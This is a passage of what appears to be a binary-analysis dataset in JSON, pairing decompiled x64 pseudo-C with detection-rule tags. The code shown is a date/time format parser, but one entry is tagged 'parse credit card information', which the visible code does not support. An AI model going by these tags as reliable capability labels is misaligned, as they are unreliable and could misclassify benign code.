piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[4] = uStack364 - 1;\n                *in_stack_00000048 = *in_stack_00000048 | 8;\n                piVar16 = piStack408;\n            }\n            break;\n        case 'I':\n        case 'O':\n            while( true ) {\n                uVar4 = piVar16 != NULL && uStack384 == 0xffff;\n                uVar19 = uStack384 == 0xffff;\n                uVar3 = uVar4;\n                if (uVar4) {\n                    if (piVar16[2] < piVar16[3]) {\n                        iVar7 = *piVar16[2];\n                    }\n                    else {\n                        in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffffffffff00 | uVar4;\n                        iVar7 = (**(*piVar16 + 0x48))(piVar16);\n                        uVar4 = in_stack_fffffffffffffe28;\n                    }\n                    uVar19 = 0;\n                    uVar3 = uVar4;\n                    if (iVar7 == -1) {\n                        piVar16 = NULL;\n                        uVar3 = 0;\n                        uStack392 = NULL;\n                        uVar19 = uVar4;\n                    }\n                }\n                bVar20 = piVar15 != NULL && bVar17;\n                bVar18 = bVar17;\n                if (bVar20) {\n                    if (piVar15[2] < piVar15[3]) {\n                        iVar7 = *piVar15[2];\n                    }\n                    else {\n                        in_stack_fffffffffffffe28 = in_stack_fffffffffffffe28 & 0xffffffffffffff00 | uVar3;\n                        iVar7 = (**(*piVar15 + 0x48))(piVar15);\n                        uVar3 = in_stack_fffffffffffffe28;\n                    }\n                    bVar18 = iVar7 == -1 && bVar20;\n                    if (iVar7 == -1) {\n                        piVar15 = NULL;\n                    }\n                }\n                if (uVar19 == bVar18) break;\n                if (uVar3 != 0) {\n                    if (piVar16[2] < piVar16[3]) {\n                        iVar7 = *piVar16[2];\n                    }\n                    else {\n                        iVar7 = (**(*piVar16 + 0x48))(piVar16);\n                    }\n                    if (iVar7 == -1) {\n                        uStack392 = NULL;\n                        piVar16 = NULL;\n                    }\n                }\n                cVar2 = (**(*piVar10 + 0x10))(piVar10);\n                if (cVar2 == '\\0') break;\n                if (piVar16[2] < piVar16[3]) {\n                    piVar16[2] = piVar16[2] + 2;\n                }\n                else {\n                    (**(*piVar16 + 0x50))(piVar16);\n                }\n                uStack384._0_2_ = 0xffff;\n                uStack384 = CONCAT22(uStack384._2_2_, 0xffff);\n            }\n            break;\n        case 'K':\n            piStack360 = *(*(arg_90h + 0x10) + 0x40);\n            piStack352 = *(*(arg_90h + 0x10) + 0x48);\n            if ((*piStack360 != 0) && (*piStack352 != 0)) {\n                uStack424 = uStack392;\n                uStack420 = uStack392._4_4_;\n                uStack416 = uStack384;\n                uStack412 = uStack380;\n                piStack440 = piVar15;\n                piStack432 = arg_88h;\n                fcn.140032f70(&piStack408, arg2, &uStack424, &piStack440, &uStack364, &piStack360, 2, in_stack_00000028\n                              , &uStack368, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11, \n                              CONCAT44(uVar21, in_stack_fffffffffffffe18), arg_78h, in_stack_fffffffffffffe28, arg_88h, \n                              arg_90h);\n                uStack392 = piStack408;\n                uStack384 = uStack384 & 0xffff0000 | uStack400;\n                piVar16 = piStack408;\n                uStack384._0_2_ = uStack400;\n                uVar21 = uStack368;\n                if ((uStack368 == 0) && (uStack364 != 0)) {\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 1;\n                    piVar16 = piStack408;\n                }\n            }\n            break;\n        case 'M':\n            goto code_r0x000140035060;\n        case 'R':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                in_stack_00000038[6] = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 | 2;\n                piVar16 = piStack408;\n            }\n            break;\n        case 'S':\ncode_r0x000140035060:\n            uStack420 = uStack392._4_4_;\n            uStack424 = uStack392;\ncode_r0x000140034cd2:\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            fcn.140033e90(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            break;\n        case 'T':\n            in_stack_fffffffffffffe00 = &uStack368;\n            uStack424 = uStack392;\n            uStack420 = uStack392._4_4_;\n            uStack416 = uStack384;\n            uStack412 = uStack380;\n            piStack440 = piVar15;\n            piStack432 = arg_88h;\n            fcn.140032a40(&piStack408, arg2, &uStack424, &piStack440);\n            uStack392 = piStack408;\n            uStack384 = uStack384 & 0xffff0000 | uStack400;\n            piVar16 = piStack408;\n            uStack384._0_2_ = uStack400;\n            uVar21 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 6;\n                bVar20 = uStack400 == 0xffff;\n                if ((piStack408 != NULL) && (bVar20)) {\n                    if (piStack408[2] < piStack408[3]) {\n                        iVar7 = *piStack408[2];\n                    }\n                    else {\n                        iVar7 = (**(*piStack408 + 0x48))();\n                    }\n                    if (iVar7 == -1) {\n                        uStack392 = NULL;\n                    }\n                    bVar20 = iVar7 == -1;\n                }\n                bVar5 = bVar17;\n                bVar13 = bVar18;\n                if (bVar18) {\n                    if (piVar15[2] < piVar15[3]) {\n                        iVar7 = *piVar15[2];\n                    }\n                    else {\n                        iVar7 = (**(*piVar15 + 0x48))(piVar15);\n                    }\n                    if (iVar7 == -1) {\n                        piVar15 = NULL;\n                        bVar13 = false;\n                        bVar5 = bVar18;\n                    }\n                    else {\n                        bVar5 = false;\n                    }\n                }\n                uVar14 = uStack364;\n                if (bVar20 == bVar5) {\ncode_r0x000140035a70:\n                    if (uVar14 < 0x45) {\n                        uVar14 = uVar14 + 100;\n                    }\n                }\n                else {\n                    fcn.1400240d0(&uStack392);\n                    cVar2 = (**(*piVar10 + 0x60))();\n                    piVar16 = uStack392;\n                    if (9 < cVar2 - 0x30U) goto code_r0x000140035a70;\n                    uVar14 = (cVar2 - 0x30U) + uVar14 * 10;\n                    piVar12 = uStack392[3];\n                    if (uStack392[2] < piVar12) {\n                        piVar11 = uStack392[2] + 1;\n                        uStack392[2] = piVar11;\n                    }\n                    else {\n                        (**(*uStack392 + 0x50))();\n                        piVar11 = piVar16[2];\n                        piVar12 = piVar16[3];\n                    }\n                    uStack384 = CONCAT22(uStack384._2_2_, 0xffff);\n                    uStack364 = uVar14;\n                    if (piVar11 < piVar12) {\n                        iVar7 = *piVar11;\n                    }\n                    else {\n                        iVar7 = (**(*piVar16 + 0x48))();\n                    }\n                    if (iVar7 == -1) {\n                        uStack392 = NULL;\n                    }\n                    bVar18 = bVar17;\n                    if (bVar13 != false) {\n                        if (piVar15[2] < piVar15[3]) {\n                            iVar8 = *piVar15[2];\n                        }\n                        else {\n                            iVar8 = (**(*piVar15 + 0x48))(piVar15);\n                        }\n                        if (iVar8 == -1) {\n                            piVar15 = NULL;\n                            bVar18 = bVar13;\n                        }\n                        else {\n                            bVar18 = false;\n                        }\n                    }\n                    if ((iVar7 == -1) != bVar18) {\n                        fcn.1400240d0(&uStack392);\n                        cVar2 = (**(*piVar10 + 0x60))(piVar10);\n                        if (cVar2 - 0x30U < 10) {\n                            if (uStack392[2] < uStack392[3]) {\n                                uStack392[2] = uStack392[2] + 2;\n                            }\n                            else {\n                                (**(*uStack392 + 0x50))(uStack392);\n                            }\n                            uStack384 = CONCAT22(uStack384._2_2_, 0xffff);\n                            uStack364 = uVar14 * 10 + cVar2 + -0x30;\n                        }\n                    }\n                    uVar14 = uStack364 - 0x76c;\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xfd;\n                }\n                in_stack_00000038[5] = uVar14;\n                piVar16 = uStack392;\n                uStack384._0_2_ = uStack384;\n            }\n        }\ncode_r0x0001400340c1:\n        noname_11 = noname_11 + 1;\n        bVar18 = uStack384 == 0xffff;\n        if ((piVar16 == NULL) || (bVar20 = bVar18,  !bVar18)) goto code_r0x000140033fa0;\ncode_r0x0001400340e1:\n        if (piVar16[2] < piVar16[3]) {\n            iVar7 = *piVar16[2];\n        }\n        else {\n            iVar7 = (**(*piVar16 + 0x48))(piVar16);\n        }\n        if (iVar7 == -1) {\n            uStack392 = NULL;\n        }\n        bVar18 = iVar7 == -1;\n        bVar13 = piVar15 != NULL && bVar17;\n        if (piVar15 == NULL || !bVar17) goto code_r0x000140033fb3;\ncode_r0x000140034118:\n        if (piVar15[2] < piVar15[3]) {\n            iVar7 = *piVar15[2];\n        }\n        else {\n            iVar7 = (**(*piVar15 + 0x48))(piVar15);\n        }\n        if (iVar7 == -1) {\n            piVar15 = NULL;\n        }\n        else {\n            bVar13 = false;\n        }\n        if (bVar18 == bVar13) goto code_r0x000140034150;\n    } while( true );\n}\n",
        "token_count": 11763
    },
    "14005cf5": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x000140065848) overlaps instruction at (ram,0x000140065845)\n// \n// WARNING: Removing unreachable block (ram,0x0001400669c4)\n// WARNING: Removing unreachable block (ram,0x0001400669cf)\n// WARNING: Removing unreachable block (ram,0x000140066fd0)\n// WARNING: Removing unreachable block (ram,0x0001400669d3)\n// WARNING: Removing unreachable block (ram,0x000140066a80)\n// WARNING: Removing unreachable block (ram,0x000140066a91)\n// WARNING: Removing unreachable block (ram,0x0001400669f0)\n// WARNING: Removing unreachable block (ram,0x000140066a9a)\n// WARNING: Removing unreachable block (ram,0x000140066aab)\n// WARNING: Removing unreachable block (ram,0x000140066ac1)\n// WARNING: Removing unreachable block (ram,0x0001400669f3)\n// WARNING: Removing unreachable block (ram,0x000140066a0b)\n// WARNING: Removing unreachable block (ram,0x000140066a13)\n// WARNING: Removing unreachable block (ram,0x0001400671e0)\n// WARNING: Removing unreachable block (ram,0x0001400671ee)\n// WARNING: Removing unreachable block (ram,0x000140067206)\n// WARNING: Removing unreachable block (ram,0x000140066a16)\n// WARNING: Removing unreachable block (ram,0x000140066a24)\n// WARNING: Removing unreachable block (ram,0x000140067300)\n// WARNING: Removing unreachable block (ram,0x00014006730e)\n// WARNING: Removing unreachable block (ram,0x000140066a2d)\n// WARNING: Removing unreachable block (ram,0x000140066a3a)\n// WARNING: Removing unreachable block (ram,0x000140067220)\n// WARNING: Removing unreachable block (ram,0x000140067636)\n// WARNING: Removing unreachable block (ram,0x00014006764b)\n// WARNING: Removing unreachable block (ram,0x000140066a43)\n// WARNING: Removing unreachable block (ram,0x000140066a4d)\n// WARNING: Removing unreachable block (ram,0x0001400672e0)\n// WARNING: Removing unreachable block (ram,0x00014006722e)\n// WARNING: Removing unreachable block (ram,0x00014006723b)\n// WARNING: Removing unreachable block (ram,0x000140066a63)\n// WARNING: Removing unreachable block (ram,0x000140066a6b)\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t * fcn.14005cf50(int64_t *arg1, ulong arg2)\n\n{\n    code **ppcVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    ulong arg1_00;\n    uint uVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    char cVar7;\n    char cVar8;\n    uint8_t uVar9;\n    code cVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int64_t iVar13;\n    int64_t *arg1_01;\n    int64_t *noname_11;\n    uint8_t *puVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    int64_t *piVar17;\n    char **arg3;\n    ulong uVar18;\n    char *pcVar19;\n    ulong *puVar20;\n    int64_t *piVar21;\n    int64_t *piVar22;\n    uint8_t uVar23;\n    uint8_t uVar24;\n    uint32_t uVar25;\n    char **arg1_02;\n    int64_t *piVar26;\n    code *UNRECOVERED_JUMPTABLE;\n    int64_t *piVar27;\n    uint *in_R8;\n    uint *in_R9;\n    int64_t *piVar28;\n    int64_t *piVar29;\n    int64_t *piVar30;\n    bool bVar31;\n    bool bVar32;\n    uchar extraout_XMM0 [16];\n    uchar auVar33 [16];\n    uchar extraout_XMM0_00 [16];\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    int64_t in_stack_00000040;\n    uint32_t *in_stack_00000048;\n    int32_t aiStackY584 [8];\n    uint32_t *in_stack_fffffffffffffde8;\n    uint uVar35;\n    uint32_t *puVar34;\n    uint32_t *in_stack_fffffffffffffe00;\n    ulong in_stack_fffffffffffffe08;\n    ulong in_stack_fffffffffffffe18;\n    uchar *arg_70h;\n    uchar *arg4;\n    code *pcVar36;\n    uint32_t uVar37;\n    uint8_t in_stack_fffffffffffffe34;\n    uchar in_stack_fffffffffffffe35;\n    uchar in_stack_fffffffffffffe36;\n    char cVar38;\n    uchar in_stack_fffffffffffffe37;\n    int32_t iStack448;\n    uchar auStack456 [12];\n    uchar auStack456_00 [16];\n    uchar auStack440 [8];\n    uint uStack432;\n    uint uStack428;\n    int64_t *piStack424;\n    uint32_t uStack416;\n    uint uStack412;\n    uint uStack408;\n    uint uStack404;\n    uint32_t uStack400;\n    uint uStack396;\n    uint uStack392;\n    uint uStack388;\n    uint32_t uStack384;\n    uint uStack380;\n    uint32_t uStack368;\n    uint32_t uStack364;\n    char *pcStack360;\n    char *pcStack352;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    int64_t *piStack312;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uchar auStack280 [16];\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uchar auStack216 [16];\n    uchar auStack200 [16];\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    \n    uVar35 = in_stack_fffffffffffffe18 >> 0x20;\n    piVar26 = aiStackY584;\n    piVar27 = NULL;\n    uStack392 = *in_R8;\n    uStack388 = in_R8[1];\n    uStack384 = in_R8[2];\n    uStack380 = in_R8[3];\n    uStack408 = *in_R9;\n    uStack404 = in_R9[1];\n    uStack400 = in_R9[2];\n    uStack396 = in_R9[3];\n    arg1_02 = in_stack_00000028 + 0xd0;\n    iVar13 = fcn.1400b35e0(arg1_02);\n    arg1_01 = fcn.1400b36a0(arg1_02);\n    noname_11 = sub.msvcrt.dll_strlen();\n    piVar28 = uStack384;\n    piVar21 = CONCAT44(uStack388, uStack392);\n    uVar37 = 0;\n    piVar30 = CONCAT44(uStack404, uStack408);\n    arg_70h = CONCAT44(uVar35, uStack400);\n    uStack368 = 0;\n    pcVar36 = 0x140025c30;\n    piVar22 = piVar28;\n    do {\n        bVar31 = piVar28 == -1;\n        arg3 = arg1_02 & 0xffffffffffffff00 | bVar31;\n        uVar23 = piVar21 != NULL && bVar31;\n        uVar24 = bVar31;\n        if (uVar23) {\n            if ((piVar21[2] < piVar21[3]) ||\n               (iVar11 = (**(*piVar21 + 0x48))(),  in_stack_fffffffffffffe34 = uVar23,  iVar11 != -1)) {\n                uVar24 = 0;\n            }\n            else {\n                uStack392 = 0;\n                uStack388 = 0;\n                uVar24 = uVar23;\n            }\n        }\n        bVar32 = arg_70h == -1;\n        piVar29 = piVar22 & 0xffffffffffffff00;\n        if ((piVar30 == NULL) || (!bVar32)) {\n            uVar24 = uVar24 ^ bVar32;\n        }\n        else if ((piVar30[3] <= piVar30[2]) &&\n                (iVar11 = (**(*piVar30 + 0x48))(),  in_stack_fffffffffffffe34 = uVar24,  iVar11 == -1)) {\n            uStack408 = 0;\n            uStack404 = 0;\n            uVar24 = uVar24 ^ 1;\n        }\n        if ((noname_11 <= piVar27) || (uVar24 == 0)) {\n            if ((uVar37 == 0) && (piVar27 == noname_11)) goto code_r0x00014005d3a0;\ncode_r0x00014005d39c:\n            *in_stack_00000030 = *in_stack_00000030 | 4;\ncode_r0x00014005d3a0:\n            *arg1 = uStack392;\n            *(arg1 + 4) = uStack388;\n            *(arg1 + 1) = uStack384;\n            *(arg1 + 0xc) = uStack380;\n            return arg1;\n        }\n        if (uVar37 != 0) goto code_r0x00014005d39c;\n        UNRECOVERED_JUMPTABLE = in_stack_00000040 + piVar27;\n        uVar16 = *UNRECOVERED_JUMPTABLE;\n        cVar10 = *(arg1_01 + uVar16 + 0x139);\n        if (cVar10 == 0x0) {\n            cVar10 = *UNRECOVERED_JUMPTABLE;\n            if (*(*arg1_01 + 0x40) != pcVar36) {\n                cVar10 = (**(*arg1_01 + 0x40))();\n            }\n            if (cVar10 != 0x0) {\n                *(arg1_01 + uVar16 + 0x139) = cVar10;\n                goto code_r0x00014005d0ec;\n            }\ncode_r0x00014005d0f4:\n            puVar14 = arg1_01[6];\n            piVar21 = CONCAT44(uStack388, uStack392);\n            if ((puVar14[*UNRECOVERED_JUMPTABLE * 2] & 0x20) != 0) {\n                piVar30 = CONCAT44(uStack404, uStack408);\n                do {\n                    uVar24 = piVar28 == -1;\n                    uVar25 = puVar14 & 0xffffff00;\n                    uVar9 = piVar21 != NULL && uVar24;\n                    uVar23 = in_stack_fffffffffffffe34;\n                    if (piVar21 != NULL && uVar24) {\n                        uVar16 = piVar21[3];\n                        if (uVar16 <= piVar21[2]) {\n                            uVar24 = uVar9;\n                            uVar16 = (**(*piVar21 + 0x48))();\n                            uVar25 = uVar16;\n                            uVar23 = uVar24;\n                            uVar9 = uVar24;\n                            if (uVar25 == 0xffffffff) {\n                                uStack392 = 0;\n                                uStack388 = 0;\n                                piVar21 = NULL;\n                                uVar9 = false;\n                                goto code_r0x00014005d1e8;\n                            }\n                        }\n                        uVar24 = 0;\n                        uVar25 = uVar16 & 0xffffff00 | (piVar30 != NULL && bVar32);\n                        in_stack_fffffffffffffe34 = uVar23;\n                        uVar6 = 0;\n                        if (piVar30 == NULL || !bVar32) goto code_r0x00014005d1f5;\ncode_r0x00014005d270:\n                        in_stack_fffffffffffffe34 = uVar9;\n                        arg3 = uVar25;\n                        uVar9 = in_stack_fffffffffffffe34;\n                        if ((piVar30[2] < piVar30[3]) ||\n                           (iVar11 = (**(*piVar30 + 0x48))(),  uVar23 = in_stack_fffffffffffffe34, \n                           uVar9 = in_stack_fffffffffffffe34,  iVar11 != -1)) {\n                            arg3 = NULL;\n                            in_stack_fffffffffffffe34 = uVar23;\n                        }\n                        else {\n                            uStack408 = 0;\n                            uStack404 = 0;\n                            piVar30 = NULL;\n                        }\n                    }\n                    else {\ncode_r0x00014005d1e8:\n                        uVar25 = uVar25 & 0xffffff00 | (piVar30 != NULL && bVar32);\n                        in_stack_fffffffffffffe34 = uVar23;\n                        uVar6 = uVar24;\n                        if (piVar30 != NULL && bVar32) goto code_r0x00014005d270;\ncode_r0x00014005d1f5:\n                        uVar24 = uVar6;\n                        arg3 = piVar22 & 0xffffff00 | bVar32;\n                    }\n                    if (uVar24 == arg3) goto code_r0x00014005d19d;\n                    piVar17 = piVar28;\n                    if (uVar9 == 0) {\ncode_r0x00014005d208:\n                        if ((*(arg1_01[6] + (piVar17 & 0xff) * 2) & 0x20) == 0) goto code_r0x00014005d19d;\n                        puVar14 = piVar21[2];\n                        if (puVar14 < piVar21[3]) goto code_r0x00014005d223;\n                        puVar14 = (**(*piVar21 + 0x50))();\n                    }\n                    else {\n                        puVar14 = piVar21[2];\n                        if (piVar21[3] <= puVar14) {\n                            piVar17 = (**(*piVar21 + 0x48))();\n                            if (piVar17 == -1) {\n                                uStack392 = 0;\n                                uStack388 = 0;\n                                piVar21 = NULL;\n                            }\n                            goto code_r0x00014005d208;\n                        }\n                        if ((*(arg1_01[6] + *puVar14 * 2) & 0x20) == 0) goto code_r0x00014005d19d;\ncode_r0x00014005d223:\n                        puVar14 = puVar14 + 1;\n                        piVar21[2] = puVar14;\n                    }\n                    uStack384 = 0xffffffff;\n                    piVar28 = 0xffffffff;\n                } while( true );\n            }\n            piVar29 = piVar29 | piVar21 != NULL;\n            cVar7 = (**(*arg1_01 + 0x20))(arg1_01);\n            uVar24 = bVar31 && piVar21 != NULL;\n            if ((uVar24) && (piVar29 = arg1_02 & 0xffffff00 | uVar24,  piVar21[3] <= piVar21[2])) {\n                iVar11 = (**(*piVar21 + 0x48))(piVar21);\n                in_stack_fffffffffffffe34 = uVar24;\n                if (iVar11 == -1) {\n                    piVar21 = NULL;\n                    uStack392 = 0;\n                    uStack388 = 0;\n                    piVar29 = NULL;\n                }\n                else {\n                    piVar29 = uVar24;\n                }\n            }\n            cVar8 = (**(*arg1_01 + 0x20))(arg1_01);\n            if (cVar7 == cVar8) {\ncode_r0x00014005d1b0:\n                piVar28 = 0xffffffff;\n                fcn.140095670(piVar21);\n                piVar30 = CONCAT44(uStack404, uStack408);\n                uStack384 = 0xffffffff;\n            }\n            else {\n                cVar7 = (**(*arg1_01 + 0x10))(arg1_01);\n                if ((((bVar31) && (piVar29 != '\\0')) && (piVar21[3] <= piVar21[2])) &&\n                   (iVar11 = (**(*piVar21 + 0x48))(piVar21),  iVar11 == -1)) {\n                    uStack392 = 0;\n                    uStack388 = 0;\n                }\n                cVar8 = (**(*arg1_01 + 0x10))();\n                piVar21 = CONCAT44(uStack388, uStack392);\n                if (cVar7 == cVar8) goto code_r0x00014005d1b0;\n                uVar37 = 4;\n                piVar21 = CONCAT44(uStack388, uStack392);\n                uStack368 = 4;\n                piVar30 = CONCAT44(uStack404, uStack408);\n            }\n            goto code_r0x00014005d19d;\n        }\ncode_r0x00014005d0ec:\n        if (cVar10 != 0x25) goto code_r0x00014005d0f4;\n        piVar30 = piVar27 + 1;\n        piVar22 = arg1_01;\n        cVar7 = fcn.140025b60(arg1_01, *(in_stack_00000040 + 1 + piVar27), 0);\n        uStack364 = 0;\n        if ((cVar7 == 'E') || (cVar7 == 'O')) {\n            piVar30 = piVar27 + 2;\n            piVar22 = arg1_01;\n            cVar7 = fcn.140025b60(arg1_01, *(in_stack_00000040 + 2 + piVar27), 0);\n            uVar24 = cVar7 - 0x25;\n            auVar33 = extraout_XMM0_00;\n            if (uVar24 < 0x55) goto code_r0x00014005d2f2;\ncode_r0x00014005d480:\n            uStack368 = 4;\n            piVar21 = CONCAT44(uStack388, uStack392);\n            piVar27 = piVar30;\n            uVar37 = 4;\n            goto code_r0x00014005d4a0;\n        }\n        uVar24 = cVar7 - 0x25;\n        auVar33 = extraout_XMM0;\n        if (0x54 < uVar24) goto code_r0x00014005d480;\ncode_r0x00014005d2f2:\n        uVar15 = *(uVar24 * 4 + 0x1400fe5a8);\n        auStack280._0_8_ = uVar15 + 0x1400fe5a8;\n        uVar23 = piVar22;\n        uVar35 = in_stack_fffffffffffffde8 >> 0x20;\n    // switch table (85 cases) at 0x1400fe5a8\n        switch(uVar24) {\n        case 0:\n            cVar7 = fcn.140023fd0(&uStack392);\n            if (*(arg1_01 + 7) == '\\0') {\n                cVar8 = fcn.140025b10(arg1_01, 0x25);\n            }\n            else {\n                cVar8 = *(arg1_01 + 0x5e);\n            }\n            if (cVar7 == cVar8) {\n                piVar21 = CONCAT44(uStack388, uStack392);\n                piVar28 = 0xffffffff;\n                fcn.140095670(piVar21);\n                uStack384 = 0xffffffff;\n                piVar27 = piVar30;\n            }\n            else {\ncode_r0x00014005e1ec:\n                piVar28 = uStack384;\n                uStack368 = 4;\n                piVar21 = CONCAT44(uStack388, uStack392);\n                piVar27 = piVar30;\n                uVar37 = 4;\n            }\n            break;\n        default:\n            goto code_r0x00014005d480;\n        case 0x1c:\n        case 0x3c:\n            iVar2 = *(iVar13 + 0x10);\n            piStack312 = *(iVar2 + 0x88);\n            uStack304 = *(iVar2 + 0x90);\n            uStack300 = *(iVar2 + 0x94);\n            uStack296 = *(iVar2 + 0x98);\n            uStack292 = *(iVar2 + 0x9c);\n            uStack288 = *(iVar2 + 0xa0);\n            uStack284 = *(iVar2 + 0xa4);\n            uStack344 = *(iVar2 + 0x68);\n            uStack340 = *(iVar2 + 0x6c);\n            uStack336 = *(iVar2 + 0x70);\n            uStack332 = *(iVar2 + 0x74);\n            uStack328 = *(iVar2 + 0x78);\n            uStack324 = *(iVar2 + 0x7c);\n            uStack320 = *(iVar2 + 0x80);\n            uStack316 = *(iVar2 + 0x84);\n            auStack280 = *(iVar2 + 0xa8);\n            uStack264 = *(iVar2 + 0xb8);\n            uStack260 = *(iVar2 + 0xbc);\n            uStack256 = *(iVar2 + 0xc0);\n            uStack252 = *(iVar2 + 0xc4);\n            pcStack360 = *(iVar2 + 0x58);\n            pcStack352 = *(iVar2 + 0x60);\n            in_stack_fffffffffffffde8 = 0xe;\n            _auStack440 = CONCAT412(uStack380, CONCAT48(uStack384, CONCAT44(uStack388, uStack392)));\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.14005c340(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38, &uStack364, &pcStack360, 0xe, \n                          in_stack_00000028, &uStack368, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11\n                          , arg_70h, pcVar36, iVar13, \n                          CONCAT17(in_stack_fffffffffffffe37, \n                                   CONCAT16(in_stack_fffffffffffffe36, \n                                            CONCAT15(in_stack_fffffffffffffe35, \n                                                     CONCAT14(in_stack_fffffffffffffe34, uVar37)))), \n                          CONCAT44(uStack404, uStack408));\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                in_stack_00000038[6] = uStack364 % 7;\n                *in_stack_00000048 = *in_stack_00000048 | 2;\n            }\n            break;\n        case 0x1d:\n        case 0x3d:\n        case 0x43:\n            iVar2 = *(iVar13 + 0x10);\n            uStack264 = *(iVar2 + 0x128);\n            uStack260 = *(iVar2 + 300);\n            uStack256 = *(iVar2 + 0x130);\n            uStack252 = *(iVar2 + 0x134);\n            uStack248 = *(iVar2 + 0x138);\n            uStack244 = *(iVar2 + 0x13c);\n            uStack240 = *(iVar2 + 0x140);\n            uStack236 = *(iVar2 + 0x144);\n            uStack232 = *(iVar2 + 0x148);\n            uStack228 = *(iVar2 + 0x14c);\n            uStack224 = *(iVar2 + 0x150);\n            uStack220 = *(iVar2 + 0x154);\n            auStack216 = *(iVar2 + 0x158);\n            auStack200 = *(iVar2 + 0x168);\n            uStack184 = *(iVar2 + 0x178);\n            uStack180 = *(iVar2 + 0x17c);\n            uStack176 = *(iVar2 + 0x180);\n            uStack172 = *(iVar2 + 0x184);\n            uStack296 = *(iVar2 + 0x108);\n            uStack292 = *(iVar2 + 0x10c);\n            uStack288 = *(iVar2 + 0x110);\n            uStack284 = *(iVar2 + 0x114);\n            auStack280 = *(iVar2 + 0x118);\n            uStack344 = *(iVar2 + 0xd8);\n            uStack340 = *(iVar2 + 0xdc);\n            uStack336 = *(iVar2 + 0xe0);\n            uStack332 = *(iVar2 + 0xe4);\n            uStack328 = *(iVar2 + 0xe8);\n            uStack324 = *(iVar2 + 0xec);\n            uStack320 = *(iVar2 + 0xf0);\n            uStack316 = *(iVar2 + 0xf4);\n            piStack312 = *(iVar2 + 0xf8);\n            uStack304 = *(iVar2 + 0x100);\n            uStack300 = *(iVar2 + 0x104);\n            pcStack360 = *(iVar2 + 200);\n            pcStack352 = *(iVar2 + 0xd0);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            in_stack_fffffffffffffde8 = 0x18;\n            fcn.14005c340(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38, &uStack364, &pcStack360, 0x18, \n                          in_stack_00000028, &uStack368, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11\n                          , arg_70h, pcVar36, iVar13, \n                          CONCAT17(in_stack_fffffffffffffe37, \n                                   CONCAT16(in_stack_fffffffffffffe36, \n                                            CONCAT15(in_stack_fffffffffffffe35, \n                                                     CONCAT14(in_stack_fffffffffffffe34, uVar37)))), \n                          CONCAT44(uStack404, uStack408));\n            piVar28 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar21 = piStack424;\n            piVar27 = piVar30;\n            uVar37 = uStack368;\n            if (uStack368 == 0) {\n                piVar28 = uStack416;\n                in_stack_00000038[4] = uStack364 % 0xc;\n                *in_stack_00000048 = *in_stack_00000048 | 0x408;\n            }\n            break;\n        case 0x1e:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar35, 99);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, 